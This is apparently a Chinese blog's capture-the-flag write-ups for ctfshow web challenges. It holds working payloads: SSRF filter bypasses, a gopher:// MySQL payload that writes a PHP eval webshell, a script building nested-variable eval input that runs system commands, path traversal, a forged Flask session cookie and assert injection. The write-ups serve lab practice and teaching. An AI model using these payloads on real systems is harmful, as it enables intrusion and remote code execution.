<span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token function">gethostbyname</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;/br>'</span><span class="token operator">.</span><span class="token variable">$ip</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;/br>'</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">filter_var</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token constant">FILTER_VALIDATE_IP</span><span class="token punctuation">,</span> <span class="token class-name">FILTER_FLAG_NO_PRIV_RANGE</span> <span class="token operator">|</span> <span class="token class-name">FILTER_FLAG_NO_RES_RANGE</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ip!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>


<span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p>gethostbyname 函数从主机数据库中检索与主机名对应的主机信息。</p>
</blockquote>
<blockquote>
<p>filter_var() 函数通过指定的过滤器过滤变量。<br>如果成功，则返回已过滤的数据，如果失败，则返回 false。</p>
</blockquote>
<blockquote>
<p>FILTER_FLAG_NO_PRIV_RANGE - 要求值是 RFC 指定的私域 IP （比如 192.168.0.1）<br>FILTER_FLAG_NO_RES_RANGE - 要求值不在保留的 IP 范围内。该标志接受 IPV4 和 IPV6 值。</p>
</blockquote>
<p><strong>RFC1918指定的私有地址有哪些?</strong></p>
<blockquote>
<p>A类：10.0.0.0&#x2F;8即10.0.0.0<del>10.255.255.255<br>B类：172.16.0.0&#x2F;12即172.16.0.0</del>172.31.255.255<br>C类：192.168.0.0&#x2F;16即192.168.0.0~192.168.255.255</p>
</blockquote>
<h2 id="358"><a href="#358" class="headerlink" title="358"></a>358</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$x</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^http:\/\/ctf\..*show$/i'</span><span class="token punctuation">,</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>正则表达式表明l以ctf.开始以show结束，中间任意</p>
<pre><code>当parse_url()解析到邮箱时：@前面是user
file_get_contents()会访问host:port/path，与user无关
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/95d0f8a3ff4c4339b93d58388abd9559.png" alt="1"></p>
<h2 id="web359"><a href="#web359" class="headerlink" title="web359"></a>web359</h2><p><strong>打无密码的mysql</strong><br>点击登陆后进入check.php文件。啥也没有，返回主页查看源码。<br><img src="https://img-blog.csdnimg.cn/cb3f6d8d75444bd588df83cb2cc1fa85.png" alt="1">发现了这个，看来一些wp，是要用gopher协议打MYSQL,,这里用到这个工具<a href="https://github.com/tarunkant/Gopherus">gopherus</a>。</p>
<p><img src="https://img-blog.csdnimg.cn/95522062ea2144718161ffab303b9848.png" alt="2"><br>意思就是输入MySQL的用户名，再给出要运行的语句。<br><code>select &quot;&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;&quot; into outfile &#39;/var/www/html/2.php&#39;;</code></p>
<blockquote>
<p>这是一个MySQL查询语句，它会将一个PHP代码片段写入到目录”&#x2F;var&#x2F;www&#x2F;html&#x2F;“下的文件”2.php”中。<br>所写入的PHP代码是”<?php @eval($_POST['cmd']);?>“。这段代码会创建一个PHP脚本，该脚本接受一个名为”cmd”的POST请求参数，然后将”cmd”参数的内容作为PHP代码执行。<br>这段代码可能被攻击者用来在Web服务器上创建一个后门，使得攻击者可以通过发送特制的POST请求来执行任意命令。</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/0b40b99caeea4464bd7f897232c326cf.png" alt="3"><br>**_**后面的url再进行一次url编码。<br>然后进入check.php文件post<br><code>returl=gopher://127.0.0.1:3306/_%25a3%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2572%256f%256f%2574%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2566%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2532%2537%2532%2535%2535%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2532%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%254b%2500%2500%2500%2503%2573%2565%256c%2565%2563%2574%2520%2522%253c%253f%2570%2568%2570%2520%2540%2565%2576%2561%256c%2528%2524%255f%2550%254f%2553%2554%255b%2527%2563%256d%2564%2527%255d%2529%253b%253f%253e%2522%2520%2569%256e%2574%256f%2520%256f%2575%2574%2566%2569%256c%2565%2520%2527%252f%2576%2561%2572%252f%2577%2577%2577%252f%2568%2574%256d%256c%252f%2532%252e%2570%2568%2570%2527%253b%2501%2500%2500%2500%2501</code><br>这时2.php文件已经成功写入，访问2.php文件进行命令执行得到flag。</p>
<h2 id="web360"><a href="#web360" class="headerlink" title="web360"></a>web360</h2><p><strong>打redis</strong><br>redis的端口是<strong>6379</strong><br>打redis即可</p>
]]></content>
      <categories>
        <category>ctfshow</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow 菜狗杯</title>
    <url>/2023/02/27/ctfshow-%E8%8F%9C%E7%8B%97%E6%9D%AF/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="我的眼里只有"><a href="#我的眼里只有" class="headerlink" title="我的眼里只有$"></a>我的眼里只有$</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token comment">/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2022-11-10 17:20:38
# @Last Modified by:   h1xa
# @Last Modified time: 2022-11-11 08:21:54
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/</span>


<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$_</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>假如传入_&#x3D;a，那么就是$<em>&#x3D;a;再传入a&#x3D;b，那就是$$</em>&#x3D;b；</p>
<h3 id="extract-定义和用法"><a href="#extract-定义和用法" class="headerlink" title="extract()定义和用法"></a>extract()定义和用法</h3><p>extract() 函数从数组中将变量导入到当前的符号表。</p>
<p>该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。</p>
<p>第二个参数 type 用于指定当某个变量已经存在，而数组中又有同名元素时，extract() 函数如何对待这样的冲突。</p>
<p>该函数返回成功导入到符号表中的变量数目。</p>
<p>所以我们要套娃传入变量，应该传入36个变量再执行命令。<br>脚本：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> string
s<span class="token operator">=</span>string<span class="token punctuation">.</span>ascii_letters
t<span class="token operator">=</span><span class="token string">'_=a&amp;'</span>
code<span class="token operator">=</span><span class="token string">"system('ls');"</span><span class="token comment">#要执行的命令</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">35</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    t<span class="token operator">+=</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">'='</span><span class="token operator">+</span>s<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">'&amp;'</span>

t<span class="token operator">+=</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">'='</span><span class="token operator">+</span>code
<span class="token keyword">print</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p>_a&amp;a&#x3D;b&amp;b&#x3D;c&amp;c&#x3D;d&amp;d&#x3D;e&amp;e&#x3D;f&amp;f&#x3D;g&amp;g&#x3D;h&amp;h&#x3D;i&amp;i&#x3D;j&amp;j&#x3D;k&amp;k&#x3D;l&amp;l&#x3D;m&amp;m&#x3D;n&amp;n&#x3D;o&amp;o&#x3D;p&amp;p&#x3D;q&amp;q&#x3D;r&amp;r&#x3D;s&amp;s&#x3D;t&amp;t&#x3D;u&amp;u&#x3D;v&amp;v&#x3D;w&amp;w&#x3D;x&amp;x&#x3D;y&amp;y&#x3D;z&amp;z&#x3D;A&amp;A&#x3D;B&amp;B&#x3D;C&amp;C&#x3D;D&amp;D&#x3D;E&amp;E&#x3D;F&amp;F&#x3D;G&amp;G&#x3D;H&amp;H&#x3D;I&amp;I&#x3D;J&amp;I&#x3D;system(‘ls’);</p>
</blockquote>
<p>再寻找flag<br>原来在**cd ..&#x2F;..&#x2F;..&#x2F;**下<br><img src="https://img-blog.csdnimg.cn/6741037228374d4f8e44c02254957c7a.png" alt="1"></p>
<h2 id="抽老婆"><a href="#抽老婆" class="headerlink" title="抽老婆"></a>抽老婆</h2><p><img src="https://img-blog.csdnimg.cn/c0f37ae3ffc04bc9bdcb011c5223db0f.png" alt="1"><strong>存在任意文件下载</strong></p>
<p><img src="https://img-blog.csdnimg.cn/b2f80d87ab79442899aa7c1789dabc7c.png" alt="2"><br>访问<strong><a href="http://c5911a6c-20fd-4771-b630-967baf205874.challenge.ctf.show/download?file=1">http://c5911a6c-20fd-4771-b630-967baf205874.challenge.ctf.show/download?file=1</a></strong>时发现挨<strong>app.py</strong>存在<a href="https://blog.csdn.net/weixin_45007073/article/details/113466902#:~:text=%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%201%20%E5%9C%A8URL%E5%86%85%E4%B8%8D%E8%A6%81%E4%BD%BF%E7%94%A8%E6%96%87%E4%BB%B6%E5%90%8D%E7%A7%B0%E4%BD%9C%E4%B8%BA%E5%8F%82%E6%95%B0%202%20%E6%A3%80%E6%9F%A5%E4%BD%BF%E7%94%A8%E8%80%85%E8%BE%93%E5%85%A5%E7%9A%84%E6%96%87%E4%BB%B6%E5%90%8D%E6%98%AF%E5%90%A6%E6%9C%89%E2%80%9C%E2%80%A6%E2%80%9D%E7%9A%84%E7%9B%AE%E5%BD%95%E9%98%B6%E5%B1%82%E5%AD%97%E7%AC%A6%203,%E5%9C%A8php.ini%E6%96%87%E4%BB%B6%E4%B8%AD%E8%AE%BE%E7%BD%AEopen_basedir%E6%9D%A5%E6%8C%87%E5%AE%9A%E6%96%87%E4%BB%B6%E7%9A%84%E7%9B%AE%E5%BD%95%204%20%E4%BD%BF%E7%94%A8realpath%E5%87%BD%E6%95%B0%E6%9D%A5%E5%B1%95%E5%BC%80%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84%E4%B8%AD%E7%9A%84%E2%80%9C.%2F%E2%80%9D%E3%80%81%20%E2%80%9C%E2%80%A6%2F%E2%80%9D%E7%AD%89%E5%AD%97%E7%AC%A6%EF%BC%8C%E7%84%B6%E5%90%8E%E8%BF%94%E5%9B%9E%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84%E5%90%8D%E7%A7%B0%205%20%E4%BD%BF%E7%94%A8basename%E5%87%BD%E6%95%B0%E6%9D%A5%E8%BF%94%E5%9B%9E%E4%B8%8D%E5%8C%85%E5%90%AB%E8%B7%AF%E5%BE%84%E7%9A%84%E6%96%87%E4%BB%B6%E5%90%8D%E7%A7%B0">目录穿越</a>访问<code>http://c5911a6c-20fd-4771-b630-967baf205874.challenge.ctf.show/download?file=../../app.py</code>得到app.py文件</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># !/usr/bin/env python</span>
<span class="token comment"># -*-coding:utf-8 -*-</span>

<span class="token triple-quoted-string string">"""
# File       : app.py
# Time       ：2022/11/07 09:16
# Author     ：g4_simon
# version    ：python 3.9.7
# Description：抽老婆，哇偶~
"""</span>

<span class="token keyword">from</span> flask <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> os
<span class="token keyword">import</span> random
<span class="token keyword">from</span> flag <span class="token keyword">import</span> flag

<span class="token comment">#初始化全局变量</span>
app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'SECRET_KEY'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'tanji_is_A_boy_Yooooooooooooooooooooo!'</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/getwifi'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">getwifi</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    session<span class="token punctuation">[</span><span class="token string">'isadmin'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token boolean">False</span>
    wifi<span class="token operator">=</span>random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span><span class="token string">'static/img'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    session<span class="token punctuation">[</span><span class="token string">'current_wifi'</span><span class="token punctuation">]</span><span class="token operator">=</span>wifi
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'getwifi.html'</span><span class="token punctuation">,</span>wifi<span class="token operator">=</span>wifi<span class="token punctuation">)</span>



<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/download'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">source</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> 
    filename<span class="token operator">=</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token string">'flag'</span> <span class="token keyword">in</span> filename<span class="token punctuation">:</span>
        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"msg"</span><span class="token punctuation">:</span><span class="token string">"你想干什么？"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> send_file<span class="token punctuation">(</span><span class="token string">'static/img/'</span><span class="token operator">+</span>filename<span class="token punctuation">,</span>as_attachment<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/secret_path_U_never_know'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">getflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> session<span class="token punctuation">[</span><span class="token string">'isadmin'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"msg"</span><span class="token punctuation">:</span>flag<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"msg"</span><span class="token punctuation">:</span><span class="token string">"你怎么知道这个路径的？不过还好我有身份验证"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>



<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">,</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>看大佬的wp原来是flask的session认证题目，需要在生成一个cookie才能得到flag。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/secret_path_U_never_know'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">getflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> session<span class="token punctuation">[</span><span class="token string">'isadmin'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"msg"</span><span class="token punctuation">:</span>flag<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"msg"</span><span class="token punctuation">:</span><span class="token string">"你怎么知道这个路径的？不过还好我有身份验证"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>看到这句找到一个路径</p>
<p><img src="https://img-blog.csdnimg.cn/57f0cfe9178e4930ad0c0a8885f3a123.png" alt="1"><br>还有身份验证？看了代码就知道要session中的isadmin为真。里面签名要用到SECRET_KEY；于是我们将isadmin的值更改后，使用密钥SECRET_KEY重新加密生成一个session。<br><a href="https://github.com/noraj/flask-session-cookie-manager">github开源脚本</a>，在kali中执行脚本<br><img src="https://img-blog.csdnimg.cn/7eea38bdf10a46e58e10b3f7980efa98.png" alt="2"><br>得到新的session，然后访问<code>http://9bae1f73-6d1c-4258-a734-cf6bed842746.challenge.ctf.show/secret_path_U_never_know</code><br>用hackbar更改cookie头，session改为新生成的。得到flag。</p>
<h2 id="一言既出"><a href="#一言既出" class="headerlink" title="一言既出"></a>一言既出</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span>  <span class="token comment">//将flag.php文件包含在当前脚本中</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">114514</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token function">assert</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"intval(<span class="token interpolation"><span class="token variable">$_GET</span><span class="token punctuation">[</span>num<span class="token punctuation">]</span></span>)==1919810"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"一言既出，驷马难追!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> 
<span class="token punctuation">&#125;</span> 
</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>可以看到，get传入num，先判断num值是否等于114514，是的话执行下面语句。<br><code>assert(&quot;intval($_GET[num])==1919810&quot;) or die(&quot;一言既出，驷马难追!&quot;);</code><br>此语句先将 GET 请求中的参数 num 转换为整数，然后判断是否等于 1919810。如果相等，则继续执行下面的代码；否则，输出错误信息并终止脚本的执行。<br><strong>那么我们可以提终止脚本的执行</strong>，也就是传入<code>?num=114514);//</code>由于在php中我们传入的<code>114514);//</code>只会辨别出前面的数字<strong>114514</strong>再执行<strong>assert</strong>此时语句提前闭合，也就是<code>assert(&quot;intval($_GET114514);//)==1919810&quot;) or die(&quot;一言既出，驷马难追!&quot;);</code>后面被注释掉了直接执行<code>echo $flag;</code>得到flag。<br><img src="https://img-blog.csdnimg.cn/da7eab8fd3c44e4bb95ac6cf0a9cf4f3.png" alt="1"></p>
<blockquote>
<p>php中其中两种比较符号:<br>&#x3D;&#x3D;：先将字符串类型转化成相同，再比较<br>&#x3D;&#x3D;&#x3D;：先判断两种字符串的类型是否相等，再比较<br>字符串和数字比较使用&#x3D;&#x3D;时,字符串会先转换为数字类型再比较<br>var_dump(‘a’ &#x3D;&#x3D; 0);&#x2F;&#x2F;true，此时a字符串类型转化成数字，因为a字符串开头中没有找到数字，所以转换为0<br>var_dump(‘123a’ &#x3D;&#x3D; 123);&#x2F;&#x2F;true，这里’123a’会被转换为123<br>var_dump(‘a123’ &#x3D;&#x3D; 123);&#x2F;&#x2F;false，因为php中有这样一个规定：字符串的开始部分决定了它的值，如果该字符串以合法的数字开始，则使用该数字至和它连续的最后一个数字结束，否则其比较时整体值为0。</p>
</blockquote>
<p>还可以使用运算法<code>/?num=114514%2B1805296</code>加号被url编码**%2B**也可得到flag。</p>
<h2 id="驷马难追"><a href="#驷马难追" class="headerlink" title="驷马难追"></a>驷马难追</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span>  
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">114514</span> <span class="token operator">&amp;&amp;</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
              <span class="token function">assert</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"intval(<span class="token interpolation"><span class="token variable">$_GET</span><span class="token punctuation">[</span>num<span class="token punctuation">]</span></span>)==1919810"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"一言既出，驷马难追!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
              <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
     <span class="token punctuation">&#125;</span> 
<span class="token punctuation">&#125;</span> 

<span class="token keyword">function</span> <span class="token function-definition function">check</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token keyword">return</span> <span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[a-z]|\;|\(|\)/"</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>其中，check() 函数的作用是检查输入的字符串中是否包含字母、分号、括号等特殊字符。如果没有包含这些字符，则返回 true，否则返回 false。</p>
</blockquote>
<p>先说一种解法，和上一题法二一样</p>
<blockquote>
<p>可以使用运算法<code>/?num=114514%2B1805296</code>加号被url编码**%2B**也可得到flag。</p>
</blockquote>
<h3 id="chatgpt对代码的分析"><a href="#chatgpt对代码的分析" class="headerlink" title="chatgpt对代码的分析"></a>chatgpt对代码的分析</h3><blockquote>
<p>该代码的作用是接受一个名为 “num” 的 GET 请求参数，如果参数值等于 114514 并且经过 check()<br>函数检查没有包含字母、分号、括号等特殊字符，则会输出 $flag 变量的值。</p>
